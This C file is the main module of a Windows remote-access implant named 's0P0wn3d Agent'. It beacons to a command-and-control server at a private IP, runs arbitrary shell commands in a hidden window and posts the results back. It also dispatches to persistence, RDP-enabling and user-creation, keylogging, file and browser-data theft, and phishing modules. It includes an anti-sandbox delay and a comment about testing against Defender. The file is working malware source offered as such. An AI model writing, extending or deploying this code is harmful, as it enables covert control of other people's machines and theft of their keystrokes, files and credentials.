#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <time.h>
#include <shlobj.h>
#include <lmcons.h>
#include "persistence.h"
#include "watchdog.h"
#include "rdp.h"
#include "keylog.h"
#include "loot.h"
#include "phish.h"

// Configuration
#define C2_SERVER "192.168.64.13"
#define C2_PORT 8443
#define BEACON_INTERVAL 10  // Secondes entre chaque beacon

// Variable globale pour arrêt propre de l'agent
volatile BOOL g_should_exit = FALSE;

// Structure pour les infos système
typedef struct {
    char hostname[256];
    char username[256];
    char os_version[256];
    char agent_id[64];
    BOOL is_admin;
    char computer_name[256];
} SystemInfo;

/**
 * Génère un ID unique basé sur le hardware
 */
void generate_agent_id(char *output, size_t size, const char *hostname) {
    // Récupérer le serial number du volume C:
    DWORD volume_serial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &volume_serial, NULL, NULL, NULL, 0);
    
    // Hash simple basé sur hostname + volume serial
    unsigned int hash = 0x811c9dc5; // FNV offset basis
    
    // Hash du hostname
    for (const char *p = hostname; *p; p++) {
        hash ^= (unsigned char)*p;
        hash *= 0x01000193; // FNV prime
    }
    
    // XOR avec volume serial
    hash ^= volume_serial;
    
    // Format: PREFIX_XXXXXXXX
    snprintf(output, size, "WIN_%08X", hash);
}

/**
 * Vérifie si le processus tourne avec les privilèges admin
 */
BOOL is_elevated() {
    BOOL is_admin = FALSE;
    PSID admin_group = NULL;
    SID_IDENTIFIER_AUTHORITY nt_authority = SECURITY_NT_AUTHORITY;
    
    // Créer un SID pour le groupe Administrators
    if (AllocateAndInitializeSid(
        &nt_authority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &admin_group))
    {
        // Vérifier si le token contient ce SID
        if (!CheckTokenMembership(NULL, admin_group, &is_admin)) {
            is_admin = FALSE;
        }
        FreeSid(admin_group);
    }
    
    return is_admin;
}

/**
 * Récupère la version de Windows
 */
void get_windows_version(char *output, size_t size) {
    // Utiliser RtlGetVersion pour contourner GetVersionEx deprecated
    // Définir les types non standards nécessaires
    typedef LONG NTSTATUS;

    typedef struct _RTL_OSVERSIONINFOW {
        ULONG dwOSVersionInfoSize;
        ULONG dwMajorVersion;
        ULONG dwMinorVersion;
        ULONG dwBuildNumber;
        ULONG dwPlatformId;
        WCHAR szCSDVersion[128];
    } RTL_OSVERSIONINFOW, *PRTL_OSVERSIONINFOW;

    typedef NTSTATUS (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        strcpy(output, "Windows");
        return;
    }
    
    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
    if (!RtlGetVersion) {
        strcpy(output, "Windows");
        return;
    }
    
    RTL_OSVERSIONINFOW version_info = {0};
    version_info.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
    
    if (RtlGetVersion(&version_info) == 0) {
        // Identifier la version
        if (version_info.dwMajorVersion == 10) {
            if (version_info.dwBuildNumber >= 22000) {
                snprintf(output, size, "Windows 11 (Build %lu)", version_info.dwBuildNumber);
            } else {
                snprintf(output, size, "Windows 10 (Build %lu)", version_info.dwBuildNumber);
            }
        } else if (version_info.dwMajorVersion == 6) {
            if (version_info.dwMinorVersion == 3) {
                strcpy(output, "Windows 8.1");
            } else if (version_info.dwMinorVersion == 2) {
                strcpy(output, "Windows 8");
            } else if (version_info.dwMinorVersion == 1) {
                strcpy(output, "Windows 7");
            }
        } else {
            snprintf(output, size, "Windows %lu.%lu", 
                    version_info.dwMajorVersion, 
                    version_info.dwMinorVersion);
        }
    } else {
        strcpy(output, "Windows");
    }
}

/**
 * Collecte toutes les informations système
 */
void collect_system_info(SystemInfo *info) {
    DWORD size;
    
    // Hostname
    size = sizeof(info->hostname);
    if (!GetComputerNameA(info->hostname, &size)) {
        strcpy(info->hostname, "UNKNOWN");
    }
    
    // Username
    size = sizeof(info->username);
    if (!GetUserNameA(info->username, &size)) {
        strcpy(info->username, "UNKNOWN");
    }
    
    // Version Windows
    get_windows_version(info->os_version, sizeof(info->os_version));
    
    // Privilèges admin
    info->is_admin = is_elevated();
    
    // Agent ID unique
    generate_agent_id(info->agent_id, sizeof(info->agent_id), info->hostname);
    
    // Computer name (peut différer de hostname)
    strcpy(info->computer_name, info->hostname);
    
    printf("[*] System Info Collected:\n");
    printf("    Agent ID:  %s\n", info->agent_id);
    printf("    Hostname:  %s\n", info->hostname);
    printf("    Username:  %s\n", info->username);
    printf("    OS:        %s\n", info->os_version);
    printf("    Admin:     %s\n", info->is_admin ? "Yes" : "No");
}

/**
 * Extrait la commande du JSON retourné par le serveur
 */
int extract_command(const char *response, char *command_out) {
    const char *start = strstr(response, "\"command\":\"");
    
    if (start == NULL) {
        return 0;
    }
    
    start += 11;
    const char *end = strchr(start, '"');
    
    if (end == NULL) {
        return 0;
    }
    
    int length = end - start;
    strncpy(command_out, start, length);
    command_out[length] = '\0';
    
    return 1;
}

/**
 * Exécute une commande shell et capture sa sortie
 */
void execute_command(const char *cmd, char *output, size_t output_size) {
    // Commandes spéciales C2
    if (strncmp(cmd, "persist", 7) == 0) {
        printf("[*] Installing persistence...\n");
        int result = install_all_persistence();
        if (result == PERSIST_SUCCESS) {
            snprintf(output, output_size, 
                    "[+] Persistence installed successfully\n"
                    "    - Registry Run Key\n"
                    "    - Scheduled Task (every 10 min)\n"
                    "    - Startup Folder\n");
        } else {
            snprintf(output, output_size, "[-] Persistence installation failed (code: %d)", result);
        }
        return;
    }
    
    if (strncmp(cmd, "killme", 6) == 0) {
        printf("[*] Self-destruct initiated...\n");
        remove_all_persistence();
        snprintf(output, output_size,
                "[+] Persistence removed\n"
                "[*] Agent will terminate after sending this message\n"
                "[*] Goodbye!");
        g_should_exit = TRUE;
        return;
    }

    if (strncmp(cmd, "exit", 4) == 0 || strncmp(cmd, "quit", 4) == 0) {
        printf("[*] Exit command received...\n");
        snprintf(output, output_size,
                "[*] Agent terminating gracefully\n"
                "[*] Goodbye!");
        g_should_exit = TRUE;
        return;
    }

    if (strncmp(cmd, "status", 6) == 0) {
        PersistenceStatus status;
        get_persistence_status(&status);

        snprintf(output, output_size,
                "[Persistence Status]\n"
                "  Registry:       %s\n"
                "  Scheduled Task: %s\n"
                "  Startup Folder: %s\n"
                "  Install Path:   %s\n",
                status.registry_installed ? "Installed" : "Not installed",
                status.task_installed ? "Installed" : "Not installed",
                status.startup_installed ? "Installed" : "Not installed",
                status.install_path);
        return;
    }

    // Commande RDP
    if (strncmp(cmd, "rdp ", 4) == 0) {
        const char *rdp_arg = cmd + 4;

        if (strcmp(rdp_arg, "enable") == 0) {
            printf("[*] Enabling RDP...\n");
            rdp_enable(output, output_size);
        }
        else if (strcmp(rdp_arg, "disable") == 0) {
            printf("[*] Disabling RDP...\n");
            rdp_disable(output, output_size);
        }
        else if (strcmp(rdp_arg, "status") == 0) {
            printf("[*] Checking RDP status...\n");
            rdp_status(output, output_size);
        }
        else if (strncmp(rdp_arg, "adduser ", 8) == 0) {
            // Parse: rdp adduser <username> <password>
            char username[128] = {0};
            char password[128] = {0};

            const char *args = rdp_arg + 8;
            if (sscanf(args, "%127s %127s", username, password) == 2) {
                printf("[*] Creating RDP user: %s...\n", username);
                rdp_adduser(username, password, output, output_size);
            } else {
                snprintf(output, output_size, "[-] Usage: rdp adduser <username> <password>");
            }
        }
        else {
            snprintf(output, output_size,
                    "[-] Unknown RDP command\n"
                    "[*] Available: rdp enable | disable | status | adduser <user> <pass>");
        }
        return;
    }

    // Commande Keylog
    if (strncmp(cmd, "keylog ", 7) == 0) {
        const char *keylog_arg = cmd + 7;

        if (strcmp(keylog_arg, "start") == 0) {
            printf("[*] Starting keylogger...\n");
            keylog_start(output, output_size);
        }
        else if (strcmp(keylog_arg, "stop") == 0) {
            printf("[*] Stopping keylogger...\n");
            keylog_stop(output, output_size);
        }
        else if (strcmp(keylog_arg, "dump") == 0) {
            printf("[*] Dumping keylog buffer...\n");
            keylog_dump(output, output_size);
        }
        else if (strcmp(keylog_arg, "status") == 0) {
            printf("[*] Checking keylog status...\n");
            keylog_status(output, output_size);
        }
        else {
            snprintf(output, output_size,
                    "[-] Unknown keylog command\n"
                    "[*] Available: keylog start | stop | dump | status");
        }
        return;
    }

    // Commande Loot
    if (strncmp(cmd, "loot ", 5) == 0) {
        const char *loot_arg = cmd + 5;

        if (strcmp(loot_arg, "sysinfo") == 0) {
            printf("[*] Collecting system information...\n");
            loot_sysinfo(output, output_size);
        }
        else if (strncmp(loot_arg, "find ", 5) == 0) {
            const char *pattern = loot_arg + 5;
            printf("[*] Searching for files: %s...\n", pattern);
            loot_find(pattern, output, output_size);
        }
        else if (strncmp(loot_arg, "grab ", 5) == 0) {
            const char *filepath = loot_arg + 5;
            printf("[*] Grabbing file: %s...\n", filepath);
            loot_grab(filepath, output, output_size);
        }
        else if (strcmp(loot_arg, "browser") == 0) {
            printf("[*] Searching for browser data...\n");
            loot_browser(output, output_size);
        }
        else if (strcmp(loot_arg, "sensitive") == 0) {
            printf("[*] Scanning for sensitive files...\n");
            loot_sensitive(output, output_size);
        }
        else {
            snprintf(output, output_size,
                    "[-] Unknown loot command\n"
                    "[*] Available: loot sysinfo | find <pattern> | grab <file> | browser | sensitive");
        }
        return;
    }

    // Commande Phish
    if (strncmp(cmd, "phish", 5) == 0) {
        const char* args = cmd + 5;
        while (*args == ' ') args++;
        cmd_phish((char*)args, output, output_size);
        return;
    }

    // Commande shell normale
    SECURITY_ATTRIBUTES sa;
    HANDLE hRead, hWrite;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    DWORD bytes_read;
    char buffer[4096];
    
    printf("[*] Exécution : %s\n", cmd);
    
    output[0] = '\0';
    
    // Créer le pipe
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        strcpy(output, "[ERROR] Failed to create pipe");
        return;
    }
    
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
    
    // Configurer le processus
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE;
    
    ZeroMemory(&pi, sizeof(pi));
    
    char cmdline[2048];
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c %s", cmd);
    
    // Lancer le processus
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        strcpy(output, "[ERROR] Failed to execute command");
        return;
    }
    
    CloseHandle(hWrite);
    
    // Lire la sortie
    size_t total_read = 0;
    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytes_read, NULL) && bytes_read > 0) {
        buffer[bytes_read] = '\0';
        
        if (total_read + bytes_read < output_size - 1) {
            strncat(output, buffer, output_size - total_read - 1);
            total_read += bytes_read;
        } else {
            break;
        }
    }
    
    // Attendre la fin (timeout 30s)
    WaitForSingleObject(pi.hProcess, 30000);
    
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    if (strlen(output) == 0) {
        strcpy(output, "[Command executed - no output]");
    }
    
    printf("[+] Output (%d bytes)\n", (int)strlen(output));
}

/**
 * Envoie le résultat d'une commande au serveur C2
 */
int send_result(const SystemInfo *sys_info, const char *command, const char *output) {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    int success = 0;
    
    printf("[*] Envoi du résultat au serveur...\n");
    
    // Créer le timestamp
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%dT%H:%M:%S", t);
    
    // Construire le JSON
    char json_data[8192];
    int json_pos = 0;
    
    // Début du JSON
    json_pos += snprintf(json_data + json_pos, sizeof(json_data) - json_pos,
                        "{\"agent_id\":\"%s\",\"command\":\"", sys_info->agent_id);
    
    // Échapper la commande
    for (const char *p = command; *p && json_pos < sizeof(json_data) - 10; p++) {
        if (*p == '"' || *p == '\\') {
            json_data[json_pos++] = '\\';
        }
        json_data[json_pos++] = *p;
    }
    
    json_pos += snprintf(json_data + json_pos, sizeof(json_data) - json_pos,
                        "\",\"output\":\"");
    
    // Échapper l'output
    for (const char *p = output; *p && json_pos < sizeof(json_data) - 10; p++) {
        if (*p == '"' || *p == '\\') {
            json_data[json_pos++] = '\\';
            json_data[json_pos++] = *p;
        } else if (*p == '\n') {
            json_data[json_pos++] = '\\';
            json_data[json_pos++] = 'n';
        } else if (*p == '\r') {
            json_data[json_pos++] = '\\';
            json_data[json_pos++] = 'r';
        } else if (*p == '\t') {
            json_data[json_pos++] = '\\';
            json_data[json_pos++] = 't';
        } else {
            json_data[json_pos++] = *p;
        }
    }
    
    json_pos += snprintf(json_data + json_pos, sizeof(json_data) - json_pos,
                        "\",\"timestamp\":\"%s\"}", timestamp);
    
    json_data[json_pos] = '\0';
    
    // Connexion au serveur
    hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) goto cleanup;
    
    hConnect = InternetConnectA(hInternet, C2_SERVER, C2_PORT, NULL, NULL,
                                INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) goto cleanup;
    
    hRequest = HttpOpenRequestA(hConnect, "POST", "/result", NULL, NULL, NULL,
                                INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) goto cleanup;
    
    // Envoyer
    char headers[] = "Content-Type: application/json\r\n";
    if (HttpSendRequestA(hRequest, headers, strlen(headers),
                        json_data, strlen(json_data))) {
        success = 1;
        printf("[+] Résultat envoyé au serveur\n");
    } else {
        printf("[-] Échec de l'envoi du résultat\n");
    }
    
cleanup:
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    
    return success;
}

/**
 * Sleep avec jitter aléatoire
 */
void sleep_with_jitter(int base_seconds) {
    srand(time(NULL) + GetTickCount());
    
    double jitter_factor = 0.7 + ((double)rand() / RAND_MAX) * 0.6;
    int sleep_ms = (int)(base_seconds * 1000 * jitter_factor);
    
    if (sleep_ms < 1000) sleep_ms = 1000;
    
    printf("[*] Sleeping %d seconds (base: %d)\n", sleep_ms / 1000, base_seconds);
    Sleep(sleep_ms);
}

/**
 * Envoie un beacon et traite les commandes reçues
 */
int do_beacon_cycle(SystemInfo *sys_info) {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;
    char response[4096];
    DWORD bytes_read = 0;
    int success = 0;
    
    printf("\n[*] === BEACON CYCLE ===\n");
    
    // 1. Connexion
    hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("[-] InternetOpen failed\n");
        goto cleanup;
    }
    
    hConnect = InternetConnectA(hInternet, C2_SERVER, C2_PORT, NULL, NULL,
                                INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("[-] InternetConnect failed\n");
        goto cleanup;
    }
    
    hRequest = HttpOpenRequestA(hConnect, "POST", "/beacon", NULL, NULL, NULL,
                                INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        printf("[-] HttpOpenRequest failed\n");
        goto cleanup;
    }
    
    // 2. Construire le beacon JSON avec les vraies infos
    char json_data[2048];
    snprintf(json_data, sizeof(json_data),
            "{\"agent_id\":\"%s\",\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"%s\",\"is_admin\":%s}",
            sys_info->agent_id,
            sys_info->hostname,
            sys_info->username,
            sys_info->os_version,
            sys_info->is_admin ? "true" : "false");
    
    char headers[] = "Content-Type: application/json\r\n";
    
    if (!HttpSendRequestA(hRequest, headers, strlen(headers), json_data, strlen(json_data))) {
        printf("[-] HttpSendRequest failed\n");
        goto cleanup;
    }
    
    // 3. Lire la réponse
    if (!InternetReadFile(hRequest, response, sizeof(response) - 1, &bytes_read)) {
        printf("[-] InternetReadFile failed\n");
        goto cleanup;
    }
    
    response[bytes_read] = '\0';
    printf("[+] Beacon sent, response: %d bytes\n", bytes_read);
    
    // 4. Parser et exécuter les commandes
    char command[256];
    if (extract_command(response, command)) {
        printf("[+] Command: %s\n", command);
        
        // Exécuter
        char result[4096];
        execute_command(command, result, sizeof(result));
        
        // Afficher localement (optionnel)
        printf("[+] Output: %.100s%s\n", result, strlen(result) > 100 ? "..." : "");
        
        // Envoyer le résultat
        send_result(sys_info, command, result);
    } else {
        printf("[-] No commands\n");
    }
    
    success = 1;
    
cleanup:
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    
    return success;
}

/**
 * Main avec boucle infinie
 */
int main() {
    SystemInfo sys_info = {0};
    HANDLE watchdog = NULL;
    HANDLE singleton_mutex = NULL;

    // Anti-sandbox: sleep aléatoire (2-5 secondes)
    srand(time(NULL) ^ GetTickCount());
    int delay = 2000 + (rand() % 3000);
    Sleep(delay);

    printf("======================================\n");
    printf("  s0P0wn3d Agent - Resilient Edition\n");
    printf("======================================\n");
    printf("[*] C2 Server: %s:%d\n", C2_SERVER, C2_PORT);
    printf("======================================\n\n");
    
    // Vérifier si un autre agent tourne déjà
    singleton_mutex = create_singleton_mutex();
    if (singleton_mutex == NULL) {
        printf("[!] Another agent instance is already running\n");
        printf("[*] Exiting...\n");
        return 0;
    }
    
    // Collecter les infos système
    collect_system_info(&sys_info);
    
    // Installer la persistence au premier lancement si pas déjà installé
    // DÉSACTIVÉ TEMPORAIREMENT pour tests anti-Defender
    // if (!is_already_installed()) {
    //     printf("\n[*] First run detected\n");
    //     install_all_persistence();
    // }
    printf("[*] Persistence disabled for AV testing\n");
    
    // Démarrer le watchdog
    // DÉSACTIVÉ TEMPORAIREMENT : le watchdog nécessite d'être un processus séparé, pas un thread
    // watchdog = start_watchdog();
    // if (watchdog == NULL) {
    //     printf("[-] Warning: Watchdog failed to start\n");
    // }
    printf("[*] Watchdog disabled (will be reimplemented as separate process)\n");
    
    printf("\n[*] Starting beacon loop...\n");
    printf("======================================\n\n");
    
    int failure_count = 0;

    // Boucle infinie (vérification de g_should_exit pour exit propre)
    while (!g_should_exit) {
        if (do_beacon_cycle(&sys_info)) {
            failure_count = 0;
        } else {
            failure_count++;
            printf("[!] Beacon failed (%d consecutive failures)\n", failure_count);
            
            if (failure_count >= 5) {
                printf("[!] Too many failures, sleeping 60 seconds...\n");
                Sleep(60000);
                failure_count = 0;
            }
        }
        
        sleep_with_jitter(BEACON_INTERVAL);
    }
    
    // Nettoyage
    // Watchdog désactivé temporairement
    // if (watchdog != NULL) {
    //     stop_watchdog(watchdog);
    // }
    
    if (singleton_mutex != NULL) {
        CloseHandle(singleton_mutex);
    }
    
    return 0;
}